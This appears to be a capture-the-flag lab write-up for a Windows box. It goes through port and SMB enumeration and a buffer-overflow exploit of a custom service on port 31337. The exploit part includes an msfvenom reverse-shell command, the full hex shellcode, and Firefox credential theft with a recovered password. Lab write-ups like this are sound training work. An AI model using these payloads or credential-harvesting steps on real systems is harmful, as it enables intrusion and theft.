## Scanning

#### Ports
```
135/tcp   open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 127
31337/tcp open  Elite?             syn-ack ttl 127
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49152/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49161/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49162/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
```

#### SMB
```
PORT    STATE SERVICE      REASON
445/tcp open  microsoft-ds syn-ack ttl 127

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.159.127\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.159.127\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.159.127\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: READ
|     Current user access: READ/WRITE
|   \\10.10.159.127\Users: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ
```

- Found a *gatekeeper.exe* on the Users share

#### Port 31337 and gatekeeper.exe

After running gatekeeper.exe locally, it becomes apparent that this is the exe for the service running under port 31337 on the target host

![exe.PNG](:/9abec9f0330f413f81264016bdb33d89)


## Exploitation

- Program crashes after fuzzer sends 200 bytes
- Find offset with Mona and cyclic pattern:
![e776723aec118aa14fdfcdab6848d274.png](:/996252d3de9045ec9aea083f9493ff7a)
	- Offset **146**
- Find JMP ESP
![f8f6ad9e1d4837a3443fe6ab1d7af4b0.png](:/b3904d4afde441e8af529c935545e9c1)
  - return address **0x080414c3**
- Generate payload
	`msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=4445 EXITFUNC=thread -b '\x00' -f c`
	- Quick check in stack shows that this does not contain any bad chars
- Final command would something like this (using my own tool)
```
python ../../tools/buffer_overflow/overflow_helper.py exploit 10.10.207.168 31337 
-r "c3140408" 
-o 146 
--padding 20 
--overflow-char "42" 
--payload "dacbb89579d27cd97424f45f33c9b15283c70431471303d26a308920643672d87557fa3d44579836f767ea1af40cbe8e8f6117a138cf418cb97cb18f397fe66f03b0fb6e44adf6221db9a5d22af775596019febe31182f114943ef909effa68ac33a702137b083e309392fcaa5c8310b0133446571ce5fb20b14d520abdf4d8c4d330b4741f85f0f46ff8c24727433eaf2ce102e5e9439773a7b4567e524e3ec08309eaf44f5934f9591a43ca73e1faa8bb7b92debed7ea1120e7fe8d05a2f82f1e2a452fd366a0251e9cbf21159a4189e86d42374af7fde1fda765c3eb28a9cd01e027ab8b042d55528cfadc4b5c5c8c73eea2d89b6873d7e37d21f2948c837b5db97c7b0c70f90953646740860f06ad1f43b2e0ec5c2afc371e1bf1d79adebf12c7b45b486cd3f6e7484d7f7b617a1f792e14d494bb472661b300b9abbbfc61edb5dc26a74f887d619fb7214247876e5d360f3e09826e898b1c20e0eb1c6"
```

## Post Exploitation

We're in and find the user flag at *C:\Users\natbat\Desktop\user.txt.txt*

Things that did not work:
- ServicePaths due to no permissions to write in Root
- Cannot even enumerate :(
- No exploitable privileges

### Solution:  
Firefox exploitation

- Use metasploit module `multi/gather/firefox_creds`
- Retrieve credentials from target
- Get firepwd tool at https://github.com/lclevy/firepwd
- Get credential set (thank you for not setting a master password):
`mayor:8CL7O1N78MdrCIsV`

- This works in RDP, so we are in and can obtain the **root flag**
